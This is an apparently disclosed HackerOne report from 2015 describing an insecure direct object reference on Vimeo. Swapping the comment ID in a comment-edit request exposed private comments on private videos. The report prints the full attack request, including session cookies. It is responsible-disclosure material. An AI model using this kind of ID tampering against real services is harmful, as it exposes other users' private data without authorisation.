@@ -1,0 +1,41 @@
+ReportLink:https://hackerone.com/reports/52181
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/patrik
+ReportedTo:Vimeo(vimeo)
+BountyAmount:150.0
+Severity:
+State:Closed
+DateOfDisclosure:04.05.2015 16:51:07
+
+Summary:
+
+Dear Vimeo Team, 
+
+in combination with my previous bug i discovered that it was possible to read any  comment on any video even if the video is private: I did a short POC on the Insecure Direct Object Reference. 
+
+If an attacker wants to exploit this issue he has to know the ID of the comment, which looks like the following : comment_id=1301116
+
+Having this ID he can push the following GET request, and change the ID to the private one: 
+
+GET /122303200?comment_id=13011164&is_sticky=0&action=comment_edit_form HTTP/1.1
+Host: vimeo.com
+Connection: keep-alive
+Accept: text/html, application/xml, text/xml, */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36
+Referer: https://vimeo.com/122303200
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4,it;q=0.2
+Cookie: clips=119241865; notification_53=1426502158; search_ref=121392801; xsrft=6e2b01771ab39f0663cd6863d69217e1.2747550b08185735962e460fafcbae86; auto_load_stats=0; vimeo=epk92dtsrc70pcdx9tsd29s7jpcdx9tsd29s7%2Cpt92xuscm9uw29mvw9rkrdutsxvt9fuvmmcrcvddr; vimeo_player=eypk92dtsrc70pcdx9tsd29s7jpcdx9tsd29s7%2Cpst9dmdt9v0kcvk25tcvfw9k0wruvrsdwxcvtdrsf; has_logged_in=1; stats_start_date=2015%2F03%2F12; stats_end_date=2015%2F03%2F16; vuid=944960715.120820070; _abexps=%7B%2248%22%3A%22%22%7D; player="captions=af.captions"; __utma=18302654.581098069.1426499521.1426499521.1426502225.2; __utmb=18302654.120.9.1426506086406; __utmc=18302654; __utmz=18302654.1426502225.2.2.utmcsr=email|utmccn=1091|utmcmd=vimeo-intro-welcome-20130100; __utmv=18302654.|2=user_type=basic=1^3=ms=0=1^7=video_count=35=1^10=vuid=944960715.120820070=1; __utmli=comment
+
+This will reveal the private comment to the attacker :
+
+I did a short POC movie for this issue : https://vimeo.com/122306957 password is vimeopoc
+
+What is happening here: 
+
+I have 1 Profile, posting a comment on a private video. Intercepting the request and save the Comment ID. 
+The 2 Profile, is running on a different account and with intercepting the Request to the change button and inserting the ID i can get the secret phrase as you can see in the video above. 
+
+i hope this one isn't too weird. :-)
+
